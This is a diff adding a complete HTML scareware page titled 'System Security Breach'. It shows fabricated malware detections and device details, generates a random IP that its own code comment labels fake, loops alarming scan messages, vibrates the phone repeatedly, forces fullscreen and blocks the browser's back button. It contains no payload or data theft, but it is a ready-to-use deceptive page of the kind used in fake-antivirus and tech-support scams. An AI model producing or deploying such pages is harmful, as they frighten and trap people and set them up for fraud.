@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>System Security Breach</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+  body {
+    margin: 0;
+    height: 100vh;
+    background: #050505;
+    font-family: "Segoe UI", Arial, sans-serif;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: #ffffff;
+  }
+
+  .container {
+    background: #0f0f0f;
+    border: 2px solid #d10000;
+    width: 94%;
+    max-width: 480px;
+    padding: 24px;
+    box-shadow: 0 0 35px rgba(209,0,0,0.75);
+  }
+
+  h1 {
+    margin: 0 0 10px;
+    color: #ff2a2a;
+    font-size: 24px;
+  }
+
+  .critical {
+    color: #ff5a5a;
+    font-weight: bold;
+    margin-bottom: 10px;
+  }
+
+  .box {
+    background: #141414;
+    border-left: 4px solid #ff0000;
+    padding: 10px;
+    margin-top: 12px;
+    font-size: 14px;
+  }
+
+  .scan {
+    margin-top: 14px;
+    font-size: 14px;
+    color: #ffb000;
+  }
+
+  .progress {
+    background: #1a1a1a;
+    height: 12px;
+    margin-top: 8px;
+    overflow: hidden;
+  }
+
+  .bar {
+    height: 100%;
+    width: 0%;
+    background: red;
+    animation: load 14s linear infinite;
+  }
+
+  @keyframes load {
+    0% { width: 0%; }
+    100% { width: 100%; }
+  }
+
+  button {
+    margin-top: 18px;
+    width: 100%;
+    padding: 14px;
+    font-size: 16px;
+    background: #d10000;
+    color: #ffffff;
+    border: none;
+    cursor: pointer;
+  }
+
+  footer {
+    margin-top: 12px;
+    font-size: 12px;
+    color: #777;
+    text-align: center;
+  }
+</style>
+</head>
+
+<body>
+
+<div class="container">
+  <h1>⚠ System Security Breach</h1>
+
+  <div class="critical">
+    Active high-risk malware detected
+  </div>
+
+  <div class="box">
+    <b>Device Information</b><br>
+    Device Model : Vivo Y39<br>
+    Security Patch : 2024-11<br>
+    Device ID : VY39-8F2A9C
+  </div>
+
+  <div class="box">
+    <b>Network Information</b><br>
+    IP Address : <span id="ip"></span><br>
+    Location : Punjab, India<br>
+    Network Status : Unsecured
+  </div>
+
+  <div class="box">
+    <b>Detected Threats</b><br>
+    • Trojan.Injector.Android<br>
+    • Spyware.DataLeak.Agent<br>
+    • Backdoor.RemoteAccess
+  </div>
+
+  <div class="scan" id="scanText">
+    Initializing deep system scan...
+  </div>
+
+  <div class="progress">
+    <div class="bar"></div>
+  </div>
+
+  <button onclick="secureNow()">Secure Device Now</button>
+
+  <footer>
+    Mobile Security Service • Real-time monitoring active
+  </footer>
+</div>
+
+<script>
+  /* ---------------- Fake IP ---------------- */
+  function fakeIP() {
+    return (
+      Math.floor(Math.random() * 100 + 100) + "." +
+      Math.floor(Math.random() * 255) + "." +
+      Math.floor(Math.random() * 255) + "." +
+      Math.floor(Math.random() * 255)
+    );
+  }
+  document.getElementById("ip").innerText = fakeIP();
+
+  /* ---------------- Scan Messages ---------------- */
+  const scanMessages = [
+    "Initializing deep system scan...",
+    "Scanning internal storage...",
+    "Analyzing installed applications...",
+    "Monitoring network traffic...",
+    "Checking permission abuse...",
+    "Threat level: CRITICAL",
+    "Immediate action required"
+  ];
+
+  let i = 0;
+  setInterval(() => {
+    document.getElementById("scanText").innerText = scanMessages[i];
+    i = (i + 1) % scanMessages.length;
+  }, 1400);
+
+  /* ---------------- Vibration ---------------- */
+  if (navigator.vibrate) {
+    navigator.vibrate([300, 150, 300]);
+    setInterval(() => {
+      navigator.vibrate(200);
+    }, 4000);
+  }
+
+  /* ---------------- Fullscreen ---------------- */
+  function enterFullscreen() {
+    const el = document.documentElement;
+    if (el.requestFullscreen) el.requestFullscreen();
+    else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+  }
+
+  document.addEventListener("click", enterFullscreen, { once: true });
+
+  function secureNow() {
+    enterFullscreen();
+  }
+
+  /* ---------------- Disable Back Button ---------------- */
+  history.pushState(null, "", location.href);
+
+  window.addEventListener("popstate", function () {
+    history.pushState(null, "", location.href);
+  });
+</script>
+
+</body>
+</html>
